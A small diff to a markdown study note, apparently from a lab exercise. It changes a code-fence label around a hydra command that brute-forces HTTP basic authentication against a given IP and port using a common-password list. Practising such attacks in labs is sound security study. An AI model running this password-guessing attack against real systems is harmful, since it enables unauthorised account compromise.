@@ -8,7 +8,7 @@ ___
 
 ![[Pasted image 20241004131415.png]]
 
-```shell-session
+```bash
 hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 83.136.254.47 http-get / -s 52283
 ```
 
